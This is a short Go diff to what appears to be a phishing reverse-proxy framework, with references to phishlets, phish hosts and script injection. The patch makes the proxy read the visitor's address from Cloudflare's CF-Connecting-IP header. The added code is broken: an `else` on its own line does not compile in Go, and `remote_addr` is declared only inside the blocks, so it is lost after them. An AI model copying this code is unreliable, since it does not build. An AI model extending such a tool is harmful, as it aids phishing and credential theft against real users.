@@ -191,8 +191,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			pl := p.getPhishletByPhishHost(req.Host)
-			parts := strings.SplitN(req.RemoteAddr, ":", 2)
-			remote_addr := parts[0]
+			if req.Header.Get("CF-Connecting-IP") != "" {
+				remote_addr := req.Header.Get("CF-Connecting-IP")
+			}
+			else {
+				parts := strings.SplitN(req.RemoteAddr, ":", 2)
+				remote_addr := parts[0]
+
+			}
 
 			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
 			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")
